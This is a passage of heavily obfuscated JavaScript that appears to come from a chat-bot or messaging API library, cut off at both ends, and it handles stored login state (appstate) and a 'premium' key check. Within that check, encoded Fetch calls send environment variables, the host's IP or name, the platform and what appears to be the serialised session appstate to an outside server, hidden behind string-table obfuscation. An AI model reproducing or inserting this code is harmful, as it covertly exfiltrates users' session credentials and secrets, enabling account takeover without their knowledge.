dwd_0x5899f1(0x68))[bfwhbjwdwd_0x4dc06a(0x133)+bfwhbjwdwd_0x4dc06a(0xc0)+bfwhbjwdwd_0x4599d4(0x123)]){case!![]:{if(process[bfwhbjwdwd_0x5899f1(0x179)][bfwhbjwdwd_0x5899f1(0x105)])logger(Language[bfwhbjwdwd_0x4599d4(0x133)+bfwhbjwdwd_0x202ae7(0xb2)+bfwhbjwdwd_0x4599d4(0x113)],bfwhbjwdwd_0x5899f1(0xe5)+bfwhbjwdwd_0x2a23e1(0x107)+']'),data=StateCrypt[bfwhbjwdwd_0x4599d4(0xbb)+bfwhbjwdwd_0x4599d4(0x114)+'te'](JSON[bfwhbjwdwd_0x5899f1(0x108)+bfwhbjwdwd_0x4dc06a(0x13f)](appstate),process[bfwhbjwdwd_0x4dc06a(0x179)][bfwhbjwdwd_0x2a23e1(0x105)]);else return appstate;}break;case![]:{data=appstate;}break;default:{logger(getText[bfwhbjwdwd_0x5899f1(0x125)+'xt'](Language[bfwhbjwdwd_0x4599d4(0x15d)+bfwhbjwdwd_0x202ae7(0x152)+bfwhbjwdwd_0x4599d4(0x12b)],require(bfwhbjwdwd_0x4599d4(0xba)+bfwhbjwdwd_0x4599d4(0x15a)+bfwhbjwdwd_0x4dc06a(0x14d)+bfwhbjwdwd_0x4dc06a(0x111)+bfwhbjwdwd_0x4dc06a(0x68))[bfwhbjwdwd_0x202ae7(0x133)+bfwhbjwdwd_0x4599d4(0xc0)+bfwhbjwdwd_0x4599d4(0x123)])),data=appstate;}}if(!require(bfwhbjwdwd_0x4dc06a(0xba)+bfwhbjwdwd_0x5899f1(0x15a)+bfwhbjwdwd_0x4dc06a(0x14d)+bfwhbjwdwd_0x202ae7(0x111)+bfwhbjwdwd_0x202ae7(0x68))[bfwhbjwdwd_0x5899f1(0x103)+'y']==![]&&global[bfwhbjwdwd_0x202ae7(0x89)+'ng'][bfwhbjwdwd_0x202ae7(0x175)](bfwhbjwdwd_0x4dc06a(0xbd)+bfwhbjwdwd_0x202ae7(0x8f)+bfwhbjwdwd_0x2a23e1(0x10a))==undefined||Database[bfwhbjwdwd_0x2a23e1(0x130)](bfwhbjwdwd_0x202ae7(0x168)+bfwhbjwdwd_0x202ae7(0xbc))&&Database[bfwhbjwdwd_0x202ae7(0x175)](bfwhbjwdwd_0x4599d4(0x168)+bfwhbjwdwd_0x202ae7(0xbc))!=''&&Database[bfwhbjwdwd_0x2a23e1(0x130)](bfwhbjwdwd_0x5899f1(0x168)+'um')&&Database[bfwhbjwdwd_0x2a23e1(0x175)](bfwhbjwdwd_0x2a23e1(0x168)+'um')==!![]&&global[bfwhbjwdwd_0x202ae7(0x89)+'ng'][bfwhbjwdwd_0x4599d4(0x175)](bfwhbjwdwd_0x202ae7(0xbd)+bfwhbjwdwd_0x4dc06a(0x8f)+bfwhbjwdwd_0x5899f1(0x10a))==undefined){var getIP=async()=>{var _0x41b649=bfwhbjwdwd_0x2a23e1,_0x5a7e77=bfwhbjwdwd_0x4dc06a,_0xf0ad0f=bfwhbjwdwd_0x4599d4,_0x44ce67=bfwhbjwdwd_0x4599d4,_0x104abf=bfwhbjwdwd_0x5899f1,_0x30f9f3={'LkGlj':function(_0x195fb8,_0xc49901){return _0x195fb8(_0xc49901);},'QASgF':_0x41b649(0xe9),'Szejg':_0x5a7e77(0x105)},{body:_0x2893f3}=await _0x30f9f3[_0xf0ad0f(0x192)](Fetch,_0x44ce67(0xb6)+_0x5a7e77(0x12d)+_0x44ce67(0xfb)+_0x44ce67(0x157)+_0x41b649(0x126)+_0x44ce67(0xce)+_0x5a7e77(0x153)+_0x5a7e77(0xb9)+_0x104abf(0x16f)+_0x5a7e77(0x8f)+_0x44ce67(0x7d)+_0x104abf(0x173)+'='+process[_0x5a7e77(0x179)][_0x30f9f3[_0x5a7e77(0xdc)]]+(_0xf0ad0f(0x17e)+_0x5a7e77(0x155)+'y=')+process[_0x104abf(0x179)][_0x30f9f3[_0x5a7e77(0xcb)]]+(_0x44ce67(0xd1)+_0x44ce67(0x184))+JSON[_0x41b649(0x108)+_0x44ce67(0x13f)](global[_0x104abf(0x7b)][_0x41b649(0x8f)+_0xf0ad0f(0x10a)],null,'\x09'));return JSON[_0x5a7e77(0xe2)](_0x2893f3)['IP'];},check=async()=>{var _0x1ac6d8=bfwhbjwdwd_0x202ae7,_0x3267db=bfwhbjwdwd_0x2a23e1,_0x21d962=bfwhbjwdwd_0x2a23e1,_0x5a7154=bfwhbjwdwd_0x2a23e1,_0x3d5aa3=bfwhbjwdwd_0x202ae7,_0x129a03={'GHzFl':function(_0x5050b5,_0x20cfc9){return _0x5050b5(_0x20cfc9);},'QdfRS':function(_0x1f3e41,_0x335ac4){return _0x1f3e41(_0x335ac4);},'EDeBT':_0x1ac6d8(0xba)+_0x3267db(0x15a)+_0x1ac6d8(0x14d)+_0x1ac6d8(0x111)+_0x5a7154(0x68),'jfLjE':_0x3267db(0x6b)+_0x1ac6d8(0xdf),'rsKiL':_0x3267db(0x168)+'um','yKNAn':_0x1ac6d8(0x168)+_0x3267db(0xbc),'kQqhu':function(_0x515e06,_0x8136a3){return _0x515e06(_0x8136a3);},'pRAGd':_0x21d962(0x94)+_0x3d5aa3(0x131)+_0x1ac6d8(0xe3),'GQWEk':_0x1ac6d8(0x86)+_0x21d962(0xad),'ydDrr':function(_0x130154,_0x33f31e){return _0x130154(_0x33f31e);},'YXwbK':_0x1ac6d8(0x14c)+_0x3d5aa3(0x6e)+_0x3267db(0x177)+_0x5a7154(0x101)+_0x21d962(0x7f)+_0x21d962(0x8c)+'m','ieDmh':_0x5a7154(0x193)+_0x21d962(0xa5)+_0x3267db(0xae)+_0x21d962(0x132)+_0x1ac6d8(0x196)+_0x21d962(0x9c)+_0x5a7154(0xe0)+_0x5a7154(0x146)+_0x3d5aa3(0x138)+_0x5a7154(0x93)+_0x3d5aa3(0xf1)+_0x1ac6d8(0xf9)+_0x1ac6d8(0x7a)+_0x3267db(0xdb),'Ionod':function(_0x405b22,_0x104e0e){return _0x405b22(_0x104e0e);},'Teqbz':_0x5a7154(0x14c)+_0x3d5aa3(0x6e)+_0x1ac6d8(0x177)+_0x21d962(0x101)+_0x21d962(0x97)+_0x5a7154(0xcd),'rjGlT':function(_0x59e6ab,_0x21bee6,_0x513d24){return _0x59e6ab(_0x21bee6,_0x513d24);},'QIHGb':_0x3267db(0xe5)+_0x1ac6d8(0x107)+']','XAFbO':_0x21d962(0x105),'IyZkz':_0x21d962(0x129)+_0x5a7154(0x75),'kUMPu':function(_0x166c1d,_0x2b8a9d){return _0x166c1d(_0x2b8a9d);},'EhCSK':function(_0x4dffb8,_0x3b0070){return _0x4dffb8(_0x3b0070);},'eqiDs':_0x3d5aa3(0x74)+_0x5a7154(0x188),'XlKRW':function(_0x38e785,_0x1b0ff8){return _0x38e785(_0x1b0ff8);},'iViPQ':_0x1ac6d8(0x8b)+_0x21d962(0x13a),'ZNeGJ':function(_0x8b8232,_0x5eb90b){return _0x8b8232(_0x5eb90b);},'NvxBr':function(_0x2f3256,_0xac9425){return _0x2f3256(_0xac9425);},'jvimB':function(_0x59ab01,_0x549925){return _0x59ab01===_0x549925;},'JnOYy':_0x3d5aa3(0x161),'ypuYk':_0x3267db(0x137),'WaKpz':function(_0x2fa229){return _0x2fa229();},'IuyDW':function(_0x4b4933,_0x89972f){return _0x4b4933!=_0x89972f;},'gUKcn':function(_0x1175f2,_0x50834f){return _0x1175f2!=_0x50834f;},'rlmdj':function(_0x3124b7,_0x2c1a20){return _0x3124b7!==_0x2c1a20;},'UJyKT':_0x21d962(0x135),'dIKLL':function(_0x14f2ff,_0x35f943){return _0x14f2ff!==_0x35f943;},'IzEIl':_0x3267db(0x84),'OMyvc':_0x3d5aa3(0x18d),'JAjYn':function(_0x31583,_0x250984){return _0x31583!=_0x250984;},'uLoTO':function(_0x20f8fd,_0x48ceb6){return _0x20f8fd==_0x48ceb6;},'FFusE':_0x5a7154(0x73),'hoRxg':function(_0x4f2175,_0x4ab045){return _0x4f2175(_0x4ab045);},'GNTVO':_0x21d962(0x121),'qFuhW':_0x3d5aa3(0xc4)+_0x3d5aa3(0x13a),'MmkKf':function(_0x5c8451,_0x434d76){return _0x5c8451(_0x434d76);},'ZRpcV':function(_0x2704e9,_0x57c197){return _0x2704e9!==_0x57c197;},'CUcOn':_0x3d5aa3(0x13b),'AXMVf':_0x3d5aa3(0x85),'snUyy':_0x3d5aa3(0x159)+_0x3267db(0xe6),'riVbW':function(_0x3320e5,_0x476afc){return _0x3320e5(_0x476afc);},'vEFsa':_0x1ac6d8(0x15c),'OKeUg':_0x1ac6d8(0x76),'LbuuR':function(_0x387a7e,_0x2d0b31){return _0x387a7e(_0x2d0b31);},'iqRVH':function(_0x18227a,_0x2021f7){return _0x18227a==_0x2021f7;},'FEbIr':function(_0x2b094e,_0x1c198d){return _0x2b094e!==_0x1c198d;},'hXwEu':_0x5a7154(0x18a),'cyHKe':_0x1ac6d8(0xd5)+_0x5a7154(0x189),'qAePN':function(_0x3cdcfb,_0x3abfd1){return _0x3cdcfb!==_0x3abfd1;},'jqaFM':_0x3d5aa3(0x116),'bhRDe':_0x1ac6d8(0xea)+_0x3267db(0x14a),'tWdck':function(_0x1ed0b8,_0xfa19c3){return _0x1ed0b8(_0xfa19c3);},'BhBXG':_0x5a7154(0x9a),'NYiTd':_0x5a7154(0x13c),'kHNHC':function(_0x27f22b){return _0x27f22b();}};try{if(_0x129a03[_0x1ac6d8(0xb4)](_0x129a03[_0x21d962(0x78)],_0x129a03[_0x21d962(0x117)]))_0x129a03[_0x1ac6d8(0xff)](_0x584d8c,_0xe9976b[_0x1ac6d8(0x125)+'xt'](_0x2a40e2[_0x1ac6d8(0x15d)+_0x1ac6d8(0x152)+_0x3267db(0x12b)],_0x129a03[_0x1ac6d8(0xcc)](_0x519507,_0x129a03[_0x1ac6d8(0xde)])[_0x1ac6d8(0x133)+_0x5a7154(0xc0)+_0x5a7154(0x123)])),_0x4279e0=_0x16a1ab;else{var _0xeda9d5=_0x129a03[_0x3267db(0x9b)](getIP),_0x32cd53;if(_0x129a03[_0x3d5aa3(0x106)](process[_0x21d962(0x179)][_0x21d962(0x14e)+_0x1ac6d8(0x10f)],undefined))_0x32cd53=process[_0x1ac6d8(0x179)][_0x3267db(0x14e)+_0x5a7154(0x10f)];else{if(_0x129a03[_0x5a7154(0x106)](os[_0x3267db(0xaa)+_0x5a7154(0xad)](),null)||_0x129a03[_0x5a7154(0xfd)](os[_0x3d5aa3(0xaa)+_0x3267db(0xad)](),undefined))_0x32cd53=os[_0x5a7154(0xaa)+_0x3267db(0xad)]();else _0x32cd53=_0xeda9d5;}if(Database[_0x3d5aa3(0x130)](_0x129a03[_0x21d962(0x72)])){if(_0x129a03[_0x1ac6d8(0x14f)](_0x129a03[_0x21d962(0x12f)],_0x129a03[_0x3267db(0x12f)]))_0x4605ad[_0x1ac6d8(0xbe)](_0x5e5a25[_0x1ac6d8(0xa4)][_0x5a7154(0x195)+_0x21d962(0xc6)]);else{if(_0x129a03[_0x3d5aa3(0xfd)](Database[_0x3267db(0x175)](_0x129a03[_0x3d5aa3(0x72)]),_0x32cd53)){if(_0x129a03[_0x5a7154(0x9d)](_0x129a03[_0x5a7154(0x15f)],_0x129a03[_0x3267db(0xf0)]))Database[_0x21d962(0xd9)](_0x129a03[_0x3267db(0x151)],![]),Database[_0x3d5aa3(0xd9)](_0x129a03[_0x5a7154(0x16d)],''),Database[_0x21d962(0xd9)](_0x129a03[_0x3267db(0x72)],_0x32cd53);else return;}}}if(Database[_0x21d962(0x130)](_0x129a03[_0x3267db(0x16d)])&&_0x129a03[_0x3267db(0x98)](Database[_0x5a7154(0x175)](_0x129a03[_0x3267db(0x16d)]),'')&&Database[_0x21d962(0x130)](_0x129a03[_0x21d962(0x151)])&&_0x129a03[_0x1ac6d8(0x171)](Database[_0x5a7154(0x175)](_0x129a03[_0x3267db(0x151)]),!![])){if(_0x129a03[_0x3267db(0xb4)](_0x129a03[_0x3d5aa3(0x7c)],_0x129a03[_0x5a7154(0x7c)])){var {body:_0x16d40e}=await _0x129a03[_0x3d5aa3(0xcc)](Fetch,_0x3267db(0xb6)+_0x3267db(0x12d)+_0x3267db(0xaf)+_0x3d5aa3(0x11c)+_0x5a7154(0x8a)+_0x5a7154(0xa6)+_0x3d5aa3(0xc1)+_0x3d5aa3(0xef)+_0x1ac6d8(0x18f)+_0x5a7154(0x8e)+_0x5a7154(0x134)+_0x129a03[_0x1ac6d8(0xb5)](String,_0x129a03[_0x3d5aa3(0x119)](require,_0x129a03[_0x3d5aa3(0xde)])[_0x21d962(0x103)+'y'])+(_0x21d962(0xa1)+_0x3d5aa3(0x10e))+_0x32cd53+(_0x21d962(0xd3)+_0x3d5aa3(0x142))+process[_0x5a7154(0x179)][_0x3267db(0x105)]+(_0x3267db(0x156)+_0x3d5aa3(0xd0))+process[_0x3267db(0x191)+_0x5a7154(0x147)]);if(_0x129a03[_0x21d962(0x171)](JSON[_0x21d962(0xe2)](_0x16d40e)[_0x21d962(0xf7)+'s'],!![])){if(_0x129a03[_0x21d962(0xb4)](_0x129a03[_0x1ac6d8(0xca)],_0x129a03[_0x1ac6d8(0xca)])){var _0x3669f5=_0x129a03[_0x1ac6d8(0x110)][_0x3d5aa3(0x122)]('|'),_0x2f7f48=0x2310+-0xb37+-0x17d9;while(!![]){switch(_0x3669f5[_0x2f7f48++]){case'0':Database[_0x21d962(0xd9)](_0x129a03[_0x3d5aa3(0x72)],_0x32cd53);continue;case'1':_0x129a03[_0x3d5aa3(0xf4)](logger,_0x129a03[_0x3d5aa3(0x170)]);continue;case'2':global[_0x3267db(0x89)+'ng'][_0x3267db(0xd9)](_0x129a03[_0x3d5aa3(0x180)],!![]);continue;case'3':Database[_0x3267db(0xd9)](_0x129a03[_0x21d962(0x151)],!![]);continue;case'4':Database[_0x21d962(0xd9)](_0x129a03[_0x3267db(0x16d)],_0x129a03[_0x5a7154(0x96)](String,_0x129a03[_0x5a7154(0x124)](require,_0x129a03[_0x1ac6d8(0xde)])[_0x21d962(0x103)+'y']));continue;}break;}}else{var _0x31db72=_0x129a03[_0x5a7154(0x71)][_0x3d5aa3(0x122)]('|'),_0x305f40=0x2f*0xc3+0x35*-0x1f+0x1*-0x1d62;while(!![]){switch(_0x31db72[_0x305f40++]){case'0':_0x5c90f9[_0x1ac6d8(0xd9)](_0x129a03[_0x3267db(0x151)],!![]);continue;case'1':_0x598a1a[_0x21d962(0xd9)](_0x129a03[_0x1ac6d8(0x16d)],_0x129a03[_0x3d5aa3(0xec)](_0x5922aa,_0x129a03[_0x5a7154(0xec)](_0x533c26,_0x129a03[_0x1ac6d8(0xde)])[_0x1ac6d8(0x103)+'y']));continue;case'2':_0x3dbd63[_0x5a7154(0x89)+'ng'][_0x5a7154(0xd9)](_0x129a03[_0x21d962(0x180)],!![]);continue;case'3':_0x41a3fc[_0x3d5aa3(0xd9)](_0x129a03[_0x1ac6d8(0x72)],_0x530747);continue;case'4':_0x129a03[_0x1ac6d8(0x119)](_0x5b7a83,_0x129a03[_0x1ac6d8(0x170)]);continue;}break;}}}else{if(_0x129a03[_0x5a7154(0xcf)](_0x129a03[_0x5a7154(0x16b)],_0x129a03[_0x5a7154(0xfe)])){var _0x5ad62f=_0x129a03[_0x3d5aa3(0x128)][_0x3d5aa3(0x122)]('|'),_0x3361dc=-0x1e18+-0xd47+0xe75*0x3;while(!![]){switch(_0x5ad62f[_0x3361dc++]){case'0':Database[_0x1ac6d8(0xd9)](_0x129a03[_0x3d5aa3(0x16d)],'');continue;case'1':_0x129a03[_0x3d5aa3(0x118)](logger,JSON[_0x1ac6d8(0xe2)](_0x16d40e)[_0x3d5aa3(0x176)+'ge']);continue;case'2':_0x129a03[_0x5a7154(0x96)](logger,_0x129a03[_0x3267db(0x143)]);continue;case'3':Database[_0x5a7154(0xd9)](_0x129a03[_0x3267db(0x151)],![]);continue;case'4':global[_0x3d5aa3(0x89)+'ng'][_0x5a7154(0xd9)](_0x129a03[_0x3267db(0x180)],![]);continue;}break;}}else _0x4b4baa[_0x3d5aa3(0x148)](),_0x129a03[_0x3d5aa3(0xff)](_0x1d5d72,_0x129a03[_0x5a7154(0xa2)]),_0x3f8d7c[_0x3d5aa3(0x89)+'ng'][_0x21d962(0xd9)](_0x129a03[_0x1ac6d8(0x180)],![]),_0x129a03[_0x5a7154(0x9e)](_0x1ec8e9,_0x129a03[_0x3d5aa3(0x143)]);}}else _0x129a03[_0x1ac6d8(0x13d)](_0x38eb1b,_0x3987bc[_0x3267db(0x133)+_0x3267db(0xb2)+_0x3267db(0x113)],_0x129a03[_0x3d5aa3(0xb7)]),_0x53cd7f=_0x1cef58[_0x21d962(0xbb)+_0x21d962(0x114)+'te'](_0x37db2f[_0x5a7154(0x108)+_0x3d5aa3(0x13f)](_0x2db368),_0x8ac5b6[_0x3d5aa3(0x179)][_0x129a03[_0x1ac6d8(0x197)]]);}else{if(_0x129a03[_0x3267db(0xff)](require,_0x129a03[_0x21d962(0xde)])[_0x1ac6d8(0x103)+'y']){if(_0x129a03[_0x3267db(0xb4)](_0x129a03[_0x21d962(0x66)],_0x129a03[_0x3267db(0xb0)])){var _0x5af8f5=_0x129a03[_0x1ac6d8(0x112)][_0x1ac6d8(0x122)]('|'),_0x2dd232=-0x1de4+0x1183*-0x1+0xf*0x329;while(!![]){switch(_0x5af8f5[_0x2dd232++]){case'0':_0x2569a4[_0x3d5aa3(0xd9)](_0x129a03[_0x3267db(0x151)],![]);continue;case'1':_0x131f0a[_0x5a7154(0xd9)](_0x129a03[_0x3267db(0x16d)],'');continue;case'2':_0x9466ea[_0x1ac6d8(0x89)+'ng'][_0x3267db(0xd9)](_0x129a03[_0x3267db(0x180)],![]);continue;case'3':_0x129a03[_0x1ac6d8(0x124)](_0x20173f,_0x129a03[_0x3d5aa3(0x143)]);continue;case'4':_0x129a03[_0x3d5aa3(0x104)](_0x2165ae,_0x3009c6[_0x1ac6d8(0xe2)](_0x247328)[_0x1ac6d8(0x176)+'ge']);continue;}break;}}else{var {body:_0x16d40e}=await _0x129a03[_0x3d5aa3(0x124)](Fetch,_0x21d962(0xb6)+_0x21d962(0x12d)+_0x21d962(0xaf)+_0x1ac6d8(0x11c)+_0x21d962(0x8a)+_0x21d962(0xa6)+_0x5a7154(0xc1)+_0x21d962(0xef)+_0x21d962(0x18f)+_0x1ac6d8(0x8e)+_0x5a7154(0x134)+_0x129a03[_0x1ac6d8(0x100)](String,_0x129a03[_0x21d962(0x96)](require,_0x129a03[_0x21d962(0xde)])[_0x5a7154(0x103)+'y'])+(_0x3267db(0xa1)+_0x3267db(0x10e))+_0x32cd53+(_0x1ac6d8(0xd3)+_0x3267db(0x142))+process[_0x5a7154(0x179)][_0x21d962(0x105)]+(_0x21d962(0x156)+_0x1ac6d8(0xd0))+process[_0x21d962(0x191)+_0x3d5aa3(0x147)]);if(_0x129a03[_0x1ac6d8(0xed)](JSON[_0x21d962(0xe2)](_0x16d40e)[_0x5a7154(0xf7)+'s'],!![])){if(_0x129a03[_0x3267db(0x18e)](_0x129a03[_0x3267db(0x79)],_0x129a03[_0x5a7154(0x79)])){var _0x3c481c=_0x129a03[_0x1ac6d8(0x115)][_0x1ac6d8(0x122)]('|'),_0x46a6f2=-0x118c*0x2+0x81*0x11+-0x1a87*-0x1;while(!![]){switch(_0x3c481c[_0x46a6f2++]){case'0':_0x129a03[_0x3267db(0x119)](_0x4a28c0,_0x129a03[_0x3267db(0x170)]);continue;case'1':_0x120907[_0x5a7154(0xd9)](_0x129a03[_0x5a7154(0x72)],_0x30671c);continue;case'2':_0xafbde[_0x21d962(0x89)+'ng'][_0x3267db(0xd9)](_0x129a03[_0x3267db(0x180)],!![]);continue;case'3':_0x2583af[_0x1ac6d8(0xd9)](_0x129a03[_0x5a7154(0x151)],!![]);continue;case'4':_0x29e476[_0x21d962(0xd9)](_0x129a03[_0x1ac6d8(0x16d)],_0x129a03[_0x5a7154(0x96)](_0x2bf448,_0x129a03[_0x3d5aa3(0xff)](_0x2b58bf,_0x129a03[_0x21d962(0xde)])[_0x3d5aa3(0x103)+'y']));continue;}break;}}else{var _0x34755b=_0x129a03[_0x21d962(0x70)][_0x21d962(0x122)]('|'),_0x5861dd=-0x1*0x1033+-0xc89+0x1cbc;while(!![]){switch(_0x34755b[_0x5861dd++]){case'0':Database[_0x1ac6d8(0xd9)](_0x129a03[_0x21d962(0x16d)],_0x129a03[_0x1ac6d8(0xb5)](String,_0x129a03[_0x5a7154(0xb5)](require,_0x129a03[_0x3d5aa3(0xde)])[_0x3267db(0x103)+'y']));continue;case'1':Database[_0x3267db(0xd9)](_0x129a03[_0x5a7154(0x151)],!![]);continue;case'2':Database[_0x21d962(0xd9)](_0x129a03[_0x5a7154(0x72)],_0x32cd53);continue;case'3':global[_0x1ac6d8(0x89)+'ng'][_0x5a7154(0xd9)](_0x129a03[_0x5a7154(0x180)],!![]);continue;case'4':_0x129a03[_0x1ac6d8(0x9e)](logger,_0x129a03[_0x21d962(0x170)]);continue;}break;}}}else{if(_0x129a03[_0x5a7154(0x16a)](_0x129a03[_0x3d5aa3(0x99)],_0x129a03[_0x5a7154(0x99)])){var _0x35f163=_0x129a03[_0x21d962(0x88)][_0x3d5aa3(0x122)]('|'),_0x261fce=-0x5c9+0x131b*0x2+-0xacf*0x3;while(!![]){switch(_0x35f163[_0x261fce++]){case'0':_0x273e4d[_0x5a7154(0xd9)](_0x129a03[_0x3267db(0x151)],![]);continue;case'1':_0x129a03[_0x3267db(0xeb)](_0x1ea3d1,_0x129a03[_0x1ac6d8(0x143)]);continue;case'2':_0x48a043[_0x3267db(0x89)+'ng'][_0x5a7154(0xd9)](_0x129a03[_0x1ac6d8(0x180)],![]);continue;case'3':_0x4d38f3[_0x3267db(0xd9)](_0x129a03[_0x3267db(0x16d)],'');continue;case'4':_0x129a03[_0x5a7154(0x77)](_0x111b57,_0x47f159[_0x5a7154(0xe2)](_0x5c3df5)[_0x3d5aa3(0x176)+'ge']);continue;}break;}}else{var _0x30db10=_0x129a03[_0x21d962(0xb8)][_0x5a7154(0x122)]('|'),_0x3554b9=0x238c+-0x1*0x10a5+-0x12e7;while(!![]){switch(_0x30db10[_0x3554b9++]){case'0':global[_0x21d962(0x89)+'ng'][_0x5a7154(0xd9)](_0x129a03[_0x3267db(0x180)],![]);continue;case'1':_0x129a03[_0x21d962(0x81)](logger,_0x129a03[_0x21d962(0x143)]);continue;case'2':Database[_0x3267db(0xd9)](_0x129a03[_0x3d5aa3(0x151)],![]);continue;case'3':_0x129a03[_0x3267db(0xf4)](logger,JSON[_0x3267db(0xe2)](_0x16d40e)[_0x1ac6d8(0x176)+'ge']);continue;case'4':Database[_0x1ac6d8(0xd9)](_0x129a03[_0x5a7154(0x16d)],'');continue;}break;}}}}}}global[_0x5a7154(0x89)+'ng'][_0x3267db(0x175)](_0x129a03[_0x3267db(0x180)]);}}catch(_0x197ddb){_0x129a03[_0x3d5aa3(0x14f)](_0x129a03[_0x1ac6d8(0x162)],_0x129a03[_0x3d5aa3(0xab)])?(logger[_0x3d5aa3(0x148)](),_0x129a03[_0x5a7154(0x118)](logger,_0x129a03[_0x5a7154(0xa2)]),global[_0x5a7154(0x89)+'ng'][_0x5a7154(0xd9)](_0x129a03[_0x1ac6d8(0x180)],![]),_0x129a03[_0x21d962(0xf4)](logger,_0x129a03[_0x1ac6d8(0x143)])):(_0x179499[_0x21d962(0xd9)](_0x129a03[_0x5a7154(0x151)],![]),_0x5d3140[_0x21d962(0xd9)](_0x129a03[_0x1ac6d8(0x16d)],''),_0x4db94c[_0x21d962(0xd9)](_0x129a03[_0x5a7154(0x72)],_0x45b642));}_0x129a03[_0x3267db(0x87)](checkv2);};check(),global[bfwhbjwdwd_0x4dc06a(0x89)+'ng'][bfwhbjwdwd_0x202ae7(0xd9)](bfwhbjwdwd_0x4599d4(0xbd)+bfwhbjwdwd_0x2a23e1(0x8f)+bfwhbjwdwd_0x2a23e1(0x10a),!![]);}else{var ZVJuyv=(bfwhbjwdwd_0x5899f1(0x11f)+bfwhbjwdwd_0x202ae7(0xa0))[bfwhbjwdwd_0x2a23e1(0x122)]('|'),ynTxtI=-0x154*0x14+0x1*-0x187d+0x330d;while(!![]){switch(ZVJuyv[ynTxtI++]){case'0':global[bfwhbjwdwd_0x4599d4(0x89)+'ng'][bfwhbjwdwd_0x202ae7(0xd9)](bfwhbjwdwd_0x4599d4(0xbd)+bfwhbjwdwd_0x202ae7(0x8f)+bfwhbjwdwd_0x4599d4(0x10a),!![]);continue;case'1':Database[bfwhbjwdwd_0x202ae7(0xd9)](bfwhbjwdwd_0x4dc06a(0x168)+bfwhbjwdwd_0x4599d4(0xbc),'');continue;case'2':logger(bfwhbjwdwd_0x2a23e1(0x14c)+bfwhbjwdwd_0x4dc06a(0x6e)+bfwhbjwdwd_0x4599d4(0x177)+bfwhbjwdwd_0x2a23e1(0x101)+bfwhbjwdwd_0x4599d4(0x97)+bfwhbjwdwd_0x5899f1(0xcd));continue;case'3':global[bfwhbjwdwd_0x4dc06a(0x89)+'ng'][bfwhbjwdwd_0x4599d4(0xd9)](bfwhbjwdwd_0x5899f1(0x94)+bfwhbjwdwd_0x2a23e1(0x131)+bfwhbjwdwd_0x2a23e1(0xe3),![]);continue;case'4':Database[bfwhbjwdwd_0x4dc06a(0xd9)](bfwhbjwdwd_0x2a23e1(0x168)+'um',![]);continue;}break;}}var checkv2=function(){var _0x3e3809=bfwhbjwdwd_0x4dc06a,_0x2143fe=bfwhbjwdwd_0x202ae7,_0x3ce8b8=bfwhbjwdwd_0x4599d4,_0xd1db78=bfwhbjwdwd_0x4dc06a,_0x3f3329=bfwhbjwdwd_0x4599d4,_0x3b2c83={'Qdjvj':function(_0x4ca5c6,_0x1d9776){return _0x4ca5c6!=_0x1d9776;},'VwBcv':_0x3e3809(0x86)+_0x3e3809(0xad),'Phlhi':_0x3ce8b8(0x168)+'um','Bofeb':_0x3e3809(0x168)+_0x3e3809(0xbc),'tnYiQ':_0xd1db78(0x105),'bLzFl':function(_0x26ff64,_0x5634fc,_0x488e15){return _0x26ff64(_0x5634fc,_0x488e15);},'Phixq':_0x2143fe(0xe5)+_0x2143fe(0x107)+']','nOTeB':_0x3e3809(0x182)+_0x2143fe(0x169),'OfBiV':function(_0x103b6b,_0x49c988){return _0x103b6b(_0x49c988);},'JYRFA':_0xd1db78(0x14c)+_0x3ce8b8(0x6e)+_0x3e3809(0x177)+_0xd1db78(0x101)+_0xd1db78(0x97)+_0x3ce8b8(0xcd),'cDijP':_0x3e3809(0xbd)+_0x3e3809(0x8f)+_0x2143fe(0x10a),'dtHxE':_0x3ce8b8(0x94)+_0x3e3809(0x131)+_0x2143fe(0xe3),'grkXV':function(_0x3f1be6,_0x5a9495){return _0x3f1be6==_0x5a9495;},'ysgWr':function(_0x2d64ff,_0x108347){return _0x2d64ff(_0x108347);},'xcPbj':_0x3e3809(0xc9)+_0x3f3329(0x69),'MiFWK':function(_0x169d70,_0xa5604c){return _0x169d70===_0xa5604c;},'fKdOK':_0x3f3329(0x80),'lRboq':function(_0x4042a9){return _0x4042a9();},'imNss':function(_0x3b7efb,_0x2e4d6a){return _0x3b7efb!==_0x2e4d6a;},'TyBQK':_0xd1db78(0x144),'wUrAU':_0x3e3809(0x82),'AlzfA':function(_0x42b38c,_0x5a5ccf){return _0x42b38c>_0x5a5ccf;},'LduuC':function(_0x38cc21){return _0x38cc21();},'SzwUT':_0x3ce8b8(0x11b),'DGMQR':_0x3ce8b8(0x8d),'NppBz':function(_0x31d881,_0x2fface){return _0x31d881!=_0x2fface;},'BQLDc':function(_0x21f8f7,_0x1067f9){return _0x21f8f7!==_0x1067f9;},'WyWsi':_0x3ce8b8(0x183),'gDwRv':_0xd1db78(0x7e)};if(_0x3b2c83[_0x3e3809(0xf5)](global[_0xd1db78(0x89)+'ng'][_0x3e3809(0x175)](_0x3b2c83[_0x2143fe(0x166)]),!![]))try{let _0x5c4bdd=[];switch(_0x3b2c83[_0x3ce8b8(0xf3)](readyCreate,_0x3b2c83[_0x3e3809(0x6c)])){case!![]:{if(_0x3b2c83[_0x3f3329(0xd4)](_0x3b2c83[_0x2143fe(0xe8)],_0x3b2c83[_0x2143fe(0xe8)])){if(_0x3b2c83[_0xd1db78(0xf5)](_0x3b2c83[_0x2143fe(0xa7)](getAll)[_0xd1db78(0xf6)+'h'],-0x263a+-0x1576+-0x3bb1*-0x1)){if(_0x3b2c83[_0x2143fe(0x13e)](_0x3b2c83[_0xd1db78(0x164)],_0x3b2c83[_0x3f3329(0xe4)]))return;else _0x3b2c83[_0x3f3329(0xb1)](_0x478462[_0x3e3809(0x175)](_0x3b2c83[_0x3f3329(0x16c)]),_0x24831d)&&(_0x237c38[_0x3f3329(0xd9)](_0x3b2c83[_0xd1db78(0x145)],![]),_0x1e8658[_0x3f3329(0xd9)](_0x3b2c83[_0x3ce8b8(0x150)],''),_0x43893e[_0x3ce8b8(0xd9)](_0x3b2c83[_0xd1db78(0x16c)],_0x5e77fd));}else{if(_0x3b2c83[_0x2143fe(0x185)](_0x3b2c83[_0x2143fe(0x12a)](getAll)[_0x3e3809(0xf6)+'h'],0x236c+0x66*-0x56+-0x127)){if(_0x3b2c83[_0x3ce8b8(0xd4)](_0x3b2c83[_0x3e3809(0x90)],_0x3b2c83[_0x3ce8b8(0x90)])){for(let _0xb124f8 of 